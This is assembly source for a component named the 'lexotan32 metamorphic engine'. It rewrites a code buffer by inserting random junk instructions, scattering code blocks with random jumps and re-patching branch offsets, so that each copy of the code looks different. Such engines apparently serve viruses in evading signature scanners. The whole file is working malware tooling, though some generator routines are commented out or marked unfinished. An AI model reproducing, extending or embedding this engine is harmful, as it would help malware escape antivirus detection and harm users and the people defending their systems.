;lexotan32 metamorphic engine

WORKSIZE equ 128*1024

GAP equ 32

MAX_RECURSION equ 3

;REMOVE_INT3 equ TRUE

grb    macro routine
  local __1
       jnz __1
       call routine
       jmp __nograble
  __1:
       dec eax
endm

malloc macro asize
       push [tmpmem]
       add [tmpmem],asize
       pop eax
endm

random_value macro
       call rnd0
endm

coin  macro
       push eax
       rnd_carry
       pop eax
endm

doublecoin macro
  LOCAL zkipz
       push eax
       rnd_carry
       jnc zkipz
       rnd_carry
  zkipz:
       pop eax
endm

RND_V = 0

rnd_carry macro
       random_value
       bt eax,RND_V
  RND_V = RND_V + 1
endm


mixbody PROC PASCAL

  ARG tmpmem:DWORD
  ARG source1:DWORD
  ARG isize:DWORD

  LOCAL changes:DWORD
  LOCAL recurse:DWORD
  LOCAL is_nop:BYTE

       pushad

       sub eax, eax
       mov [recurse], eax
       mov [eip_table_cnt], eax
       mov [jmp_table_cnt], eax
       mov dwo [registers], NOGARBLE

       mov eax,source1
       mov source,eax

       malloc WORKSIZE*8                   ;max if all opcodes are 1 byte long
       mov [eip_table], eax
       malloc WORKSIZE*9                   ;max if all opcodes are JMPs
       mov [jmp_table], eax

       malloc WORKSIZE
       mov [outbuffer], eax
       mov edi, eax

       mov esi, [source]

       call fill_nops

       ;***gen subroutines

       push WORKSIZE-GAP
       call rnd
       add edi, eax

  @@phase1:
       mov eax, [isize]
       add eax, [source]
       cmp esi, eax                     ;we already processed the whole buffer?
       jae @@done_phase1

       call link_eip

IFDEF REMOVE_INT3
       cmp by [esi], 0cch
       je @@skip_instr
ENDIF
       cmp by [esi],90h
       jne @@no_shit
  @@skip_instr:
       inc esi
       jmp @@phase1

  @@no_shit:
       cmp wo [esi], 0f481h
       jne @@no_xoresp
       mov eax,[esi+2]
       mov [registers], eax
       jmp @@commandword
  @@no_xoresp:

       call check4jmps
       jc @@insert_nocode

  @@commandword:
       call disasm
       mov ecx,[disasm_size]
       rep movsb

  @@insert_nocode:
       call garble

  @@change_eip:
       coin
       jnc @@no_add_jmp

  @@do_change:
       call change_eip

  @@no_add_jmp:
       call check_eip_range
       jne @@do_change                  ;uhh, a used area!

       jmp @@phase1


  @@done_phase1:
       call fix_damn_jmps
       call fix_userlist

       malloc WORKSIZE

       xchg eax, [outbuffer]
       mov [source], eax
       mov dwo [isize], WORKSIZE

  @@optimize:                           ;START OF 2ND PHASE
       sub eax, eax
       mov dwo [changes], eax  ;mark no changes done
       mov [eip_table_cnt], eax
       mov [jmp_table_cnt], eax
       mov [is_nop],al


       mov esi, [source]
       mov edi, [outbuffer]
       call fill_nops


  @@optimize_loop:
       mov eax, [isize]
       add eax, [source]
       cmp esi, eax
       jae @@optimize_loop_done                 ;all processed?

       mov al, [esi]

       cmp al, 090h
       jne @@nonop
       cmp by [is_nop],0
       jne @@skip1s           ;skip da NOP! (no increase coz is in row)
       inc by [is_nop]
       call link_eip            ;first NOP in a row is linked...
       jmp @@skip1              ;skip da NOP! (and increase no. of changes)
  @@nonop:

       mov by [is_nop],0

       call link_eip

       cmp al, 0e9h
       jne @@no_jmpb
       mov eax, [esi+1]
       test eax, eax
       jz @@skip5              ;the JMP jump to the next instruction?
       call is_signed
       jnz @@done_jmps
       mov dwo [esi], 0eb909090h
       mov [esi+4], al
       jmp @@optimize_loop

  @@no_jmpb:
       cmp al, 0ebh
       jne @@no_jmp
  @@check_byte4_0:
       mov al, [esi+1]
       test al, al
       jnz @@done_jmps
       inc esi
       jmp @@skip1

  @@skip6:
       inc esi

  @@skip5:
       inc esi
  @@skip4:
       inc esi
  @@skip3:
       add esi,2                     ;skip instruction (4 bytes)

  @@skip1:
       inc dwo [changes]     ;changes were done, so, must
  @@skip1s:
       inc esi
       jmp @@optimize_loop                      ;have a next loop

  @@check_s_jcc:
       and dl, not 0fh
       sub dl,70h
       jnz @@done_jmps
       jmp @@check_byte4_0

  @@no_jmp:
       mov edx, [esi]
       cmp dl, 0fh
       jne @@check_s_jcc                ;extended opcode?
       mov dl, dh
       and edx, 01111000000001111b
       cmp dh, 80h
       jne @@done_jmps                ;make sure is a JMP?
       or dl, 70h
       mov eax, [esi+2]
       test eax,eax
       jz @@skip6
       call is_signed
       jnz @@done_jmps                ;and can be converted?
       mov dh, al
       mov dwo [esi], 90909090h
       mov wo [esi+4], dx
       jmp @@optimize_loop

  @@done_jmps:
       call check4jmps
       jc @@optimize_loop

       call disasm
       mov ecx,[disasm_size]
       rep movsb

       jmp @@optimize_loop


  @@optimize_loop_done:
       call fix_damn_jmps
       call fix_userlist

       mov ebx, [source]
       xchg ebx, [outbuffer]
       mov [source], ebx

       mov ecx, WORKSIZE-1
       lea edi, [ebx+ecx]
       mov al, 90h
       std
       repe scasb                       ;scan for last NOP
       cld
       scasw                            ;increase EDI by 2
       sub edi, ebx
       mov [isize], edi         ;update new size of data

       mov eax, [changes]
       test eax,eax
       jnz @@optimize                 ;if we didnt any change, we finished

       mov eax, [outbuffer]
       mov [esp.Pushad_esi], eax
       mov eax, [isize]
       mov [esp.Pushad_ecx], eax

       popad
       ret
mixbody ENDP


check4jmps:
       push ebx

       sub ebx, ebx             ;default 32b displacement
       mov eax, [esi]

       cmp al, 0e8h                     ;maybe a CALL?
       je @@is_call
       cmp al, 0e9h                     ;is a JMP?
       jne @@no_jmp

  @@is_call:
       movsb
       lodsd
       stosd
  @@do_jmp_table:
       mov ecx, edi                     ;ecx is where patch+4
  @@no8b:
       add eax, esi
       sub eax, [source]     ;add to
       push edi
       mov edi, [jmp_table_cnt]
       lea edi, [edi+edi*8]           ;offset of referenced instruction
       add edi, [jmp_table]
       stosd
       mov eax, ecx
       stosd                          ;save patch point
       mov eax,ebx
       stosb
       inc dwo [jmp_table_cnt]
       pop edi
       jmp @@processed

  @@no_jmp:
       cmp al, 0fh
       jne @@isnt_jcc_near                   ;extended opcode?
       and ah, 011110000b
       cmp ah, 80h                      ;is a near JCC?
       jne @@isnt_jcc_near
       movsb
       jmp @@is_call

  @@isnt_jcc_near:
       inc ebx

       cmp al, 0ebh
       je @@short_shit
       and al, 011110000b
       cmp al, 70h
       je @@short_shit
       clc
       jmp @@processed2

  @@short_shit:
       lodsw
       stosw
       movsx eax, ah
       jmp @@do_jmp_table

  @@processed:
       stc
  @@processed2:
       pop ebx
       ret


link_eip:
       pushad                         ;save current edi
       mov eax, edi
       mov edi, [eip_table]             ;table base
       mov ecx, [eip_table_cnt]             ;index
       lea edi, [edi+ecx*8]           ;place to put eip/eip
       sub eax, [outbuffer]
       stosd
       mov eax, esi
       sub eax, [source]
       stosd                          ;save esi
       inc dwo [eip_table_cnt]
       popad
       ret


xref:
       pushad
       mov ecx, [eip_table_cnt]
       mov esi, [eip_table]
  @@xref_loop:
       dec ecx
       js @@found
       cmp [esi+ecx*8+4], eax
       jne @@xref_loop
  @@equal:
       mov ecx, [esi+ecx*8]
  @@found:
       mov [esp.Pushad_eax], ecx
       popad
       ret


change_eip:
       pushad
       push WORKSIZE-GAP
       call rnd
       add eax, [outbuffer]
       mov ebx, eax                    ;And check if is free
       mov edi, 90909090h
       cmp [eax-4], edi
       jne @@no_eip_change
       xchg edi, eax
       mov ecx, GAP/4
       repe scasd                       ;unused space?
       jne @@no_eip_change
       sub edi, GAP+5
       mov eax, ebx
       xchg eax, [esp.Pushad_edi]                  ;set the new eip
       xchg eax, edi
       sub eax, edi
       stosb
       stosd                    ;displacement
       mov by [edi-5], 0e9h            ;build JMP
  @@no_eip_change:
       popad
       ret

fix_userlist:
       mov esi,[userlist]
  @@next_userptr:
       lodsd
       cmp eax, -1
       je @@done_userlist               ;no more pointers to process? exit...
       call xref
       mov [esi-4], eax                 ;update ptr
       jmp @@next_userptr
  @@done_userlist:
       ret


fix_damn_jmps:
       mov esi,[jmp_table_cnt]
       lea esi,[esi+esi*8]
       add esi,[jmp_table]

  @@fix_jmp:
       cmp esi, [jmp_table]
       jz @@done_fix_jmp
       sub esi, 9

       mov eax, [esi]
       mov edi, [esi+4]
       call xref                        ;translate old offset to new

       mov ecx, edi
       sub ecx, [outbuffer]
       sub eax, ecx                     ;calculate new relative distance
  @@near:
       cmp by [esi+8],0
       jne @@short
       mov [edi-4], eax             ;and patch
       jmp @@fix_jmp
  @@short:
       mov [edi-1], al             ;patch 8b displacement
       jmp @@fix_jmp

  @@done_fix_jmp:
       ret


rnd0:
       push 0
       call rnd
       ret


is_signed:
       push ecx
       movsx ecx, al
       cmp eax, ecx
       pop ecx
       ret


fill_nops:
       push edi
       mov ecx, WORKSIZE                     ;fill outbuffer with NOPs
       mov al, 90h
       rep stosb
       pop edi
       ret


GetAnyReg:
       random_value                     ;get random number between 0..7
       and eax, 0111b                   ;that correspond to the eax..edi range
       cmp al,ESP_
       je GetAnyReg                     ;cant be ESP
       ret


Get8bitRegFree:
       mov eax,[registers]
       and eax, 01111b                  ;just keep the e?x registers
       cmp eax, 01111b
       jne @@somefree                   ;all are in use?
       stc
       ret                              ;yeahh, error...
  @@somefree:
       random_value                     ;choose a register that have 8 bits
       and eax, 011b                    ;al,cl,dl,bl
       bt [registers], eax         ;is used? choose another
       jc @@somefree
       coin                    ;random flag
       jc @@lowpart
       or al, 0100b                     ;turn to hi-part (ah,ch,dh,bh)
  @@lowpart:
       clc
       ret


Get32bitRegFree:
       cmp by [registers],_EAX+_ECX+_EDX+_EBX+_EBP+_ESI+_EDI
       jne @@retry
       add esp,4
       stc
       ret
  @@retry:
       call GetAnyReg                   ;get a 32bit reg
       bt [registers], eax
       jc @@retry
       ret

check_eip_range:
       mov eax, [outbuffer]
       add eax, WORKSIZE-GAP
       cmp edi, eax                     ;if too near end of buffer, a JMP is
       ja @@ret                         ;essencial
       push edi
       mov eax, 90909090h
       mov ecx, GAP/4
       repe scasd                       ;check bytes forward...
       pop edi
  @@ret:
       ret

garble:
       pushad

       mov ecx, [recurse]
       inc dwo [recurse]
       cmp ecx, MAX_RECURSION                ;we cant left this routine go
       jae __too_deep                       ;very deep recursively

       random_value
       and eax, 0111b

       mov ecx, eax
       jecxz __too_deep                       ;no garbling this time

       test dwo [registers],_DOUBLE
       jz __next_garble
       shl ecx,1
  __next_garble:
       push ecx

       push 20                  ;number_of_garbling_routines
       call rnd                          ;in the table

       test eax,eax
       grb lea_dword
       grb math_byte
       grb math_dword
       grb movr_byte
       grb movr_dword
       grb mov_dword
       grb mov_word
       grb mov_byte
       grb inc_dec
       grb mov_zs_x

;       grb cmd_mem
;       grb mov_mem

;       grb make_jcc            ;fix
;       grb gen_pushpop         ;fix

;       grb gen_sub		;todo
;       grb call_sub		;todo

       org $-1

  __nograble:
       call check_eip_range
       je __has_space
       call change_eip
       jmp __nograble
  __has_space:

       pop ecx
       loop __next_garble

  __too_deep:
       dec dwo [recurse]
       mov [esp.Pushad_edi], edi          ;actualize copy of edi in stack
  __error666:
       popad
       ret


lea_dword:
       call Get32bitRegFree
       shl eax, 3
       mov edx,eax
       mov al, 8dh
       stosb
       call GetAnyReg
       or eax, edx
       or al, 80h
       stosb
  __store_rnd_dword:
       random_value
       stosd
  __ret:
       ret


math_byte:
       bt dwo [registers],FLAGS_
       jc __ret
       push 8
       call rnd
       shl eax, 3
       or eax, 1000000011000000b               ;make math operation
       mov edx,eax
       call Get8bitRegFree
       jc __ret
       or eax, edx
       xchg al, ah
       stosw
  __store_rnd_byte:
       random_value
       stosb                                   ;byte
       ret


math_dword:
       bt dwo [registers],FLAGS_
       jc __ret
       push 8
       call rnd
       shl eax, 3
       or eax, 08100h+(011000000b)
       mov edx,eax
       call Get32bitRegFree
       or eax, edx                             ;patch reg into
       xchg al,ah
       stosw
       jmp __store_rnd_dword


movr_byte:
       call Get8bitRegFree
       jc __ret
       push eax
       mov al, 08ah
       jmp _reg_reg


movr_dword:
       call Get32bitRegFree
       push eax
       mov al, 08bh
  _reg_reg:
       stosb
       call GetAnyReg
       mov edx,eax
       pop eax                                 ;outbuffer
       shl eax, 3
       or eax, edx
       or eax, 11000000b
       stosb
       ret


mov_dword:
       call Get32bitRegFree
       or al, 0b8h
       stosb
       jmp __store_rnd_dword


mov_word:
       call Get32bitRegFree
       shl eax, 8
       or eax, 0b866h
       stosw
  __store_rnd_word:
       random_value
       stosw
       ret


mov_byte:
       call Get8bitRegFree
       jc __ret
       or al, 0b0h
       stosb
       jmp __store_rnd_byte


inc_dec:
       bt dwo [registers],FLAGS_
       jc __ret
       call Get32bitRegFree
       add al, 40h
       coin
       jc @@set_bit
       or al, 01000b                           ;inc/dec
  @@set_bit:
       stosb
       ret


mov_zs_x:
       call Get32bitRegFree
       push eax
       coin
       mov eax, 0b60fh
       jc @@zero
       mov ah, 0beh                            ;z/s
  @@zero:
       coin
       adc ah, 0                               ;16/8
       stosw
       call GetAnyReg
       mov edx, eax
       pop eax
       shl eax, 3
       or eax, edx
       or al, 0c0h
       stosb
       ret


SPECIAL_MAGIC1 EQU "oxeL"
SPECIAL_MAGIC2 EQU "oxeL"+0400h
XORVAL         EQU 62851472h

cmd_mem:
       bt dwo [registers],FLAGS_
       jc __exitproc

       push 0
       call rnd
       and eax, 3fh
       btr eax,5
       lea edx,[eax*8]         ;edx=imm / read|write / byte|dword / opcode
       jc __imm_imm

       bt edx,6
       jnc __byte                       ;if is DWORD operation
       or dl, 01b                       ;set bit 0
  __byte:
       bt edx,7
       jnc __read                       ;if is a WRITE operation
       mov ebx, SPECIAL_MAGIC2 XOR XORVAL
       and dl, 00111001b
       call GetAnyReg                   ;and use any register as source
       jmp __generic

  __read:
       mov ebx, SPECIAL_MAGIC1 XOR XORVAL
       or dl, 010b                      ;set bit 1
       btr edx,6                        ;if is a READ operation
       jc __dword
       call Get8bitRegFree              ;get a free 8bit register...
       jc __exitproc
       jmp __generic
  __dword:
       call Get32bitRegFree             ;or a free 32bit register
  __generic:

       ;eax=register
       ;ebx=SPECIAL_VALUEx
       ;dl=opcode
       xor ebx, XORVAL
       xchg eax,edx
       stosb                            ;opcode
       lea eax,[edx*8+0101b]
       stosb                            ;modrm
       mov eax,ebx
       stosd
  __exitproc:
       ret

  __imm_imm:
       and dl, 10111111b        ;discart read/write flag, coz is always write
       mov eax,edx
       shl eax,8
       mov al, 80h
       btr eax,15
       jnc __byte_imm
       inc al
  __byte_imm:
       add eax,0500h
       stosw
       mov eax,SPECIAL_MAGIC2 XOR XORVAL
       xor eax,XORVAL
       stosd
       bt edx,7
       jc __store_rnd_dword
       jmp __store_rnd_byte


mov_mem:
       push 0
       call rnd
       and eax,011b
       add eax,88h
       mov edx,eax
       mov ebx, SPECIAL_MAGIC1 XOR XORVAL       ;read(free regs only)

       bt edx,1
       jc @@read
       xor ebx,(SPECIAL_MAGIC1 xor XORVAL) XOR (SPECIAL_MAGIC2 xor XORVAL);write
       call GetAnyReg
       jmp __generic

  @@read:
       bt edx,0
       jnc @@byte
       call Get32bitRegFree             ;or a free 32bit register
       jmp @@continue
  @@byte:
       call Get8bitRegFree              ;get a free 8bit register...
       jc __exitproc
  @@continue:
       jmp __generic


comment &
make_jcc:
       doublecoin
       jc __ret

       random_value
       and eax,0111100000000b
       or eax, 800fh
       stosw
       stosd
       push edi
       call garble
       pop eax
       mov ecx,edi
       sub ecx,eax
       mov [eax-4],ecx          ;correct JCC
       ret

gen_pushpop:
       doublecoin
       jc __ret
       random_value
       and eax, 011h
       test eax, eax
       jz pushm_popm
       dec eax
       jz pushm_pop
       dec eax
       jz push_popm

push_pop:
       call Get32bitRegFree
       push eax
       call GetAnyReg
       or al, 50h
       stosb
  __popreg:
       call garble                             ;recurse into
       pop eax
       add eax,58h
       stosb
       ret

pushm_pop:
       call Get32bitRegFree
       push eax
       mov eax, 035ffh
       stosw
       mov eax, SPECIAL_MAGIC1+4
       sub eax,4
       stosd
       jmp __popreg


push_popm:
       call GetAnyReg
       or al, 50h
       stosb
  __popmem:
       call garble                             ;recurse into
       mov eax, 058fh
       stosw
       mov eax, SPECIAL_MAGIC2+4
       sub eax,4
       stosd
       ret


pushm_popm:
       mov eax, 035ffh
       stosw
       mov eax, SPECIAL_MAGIC1+4
       sub eax,4
       stosd
       jmp __popmem

&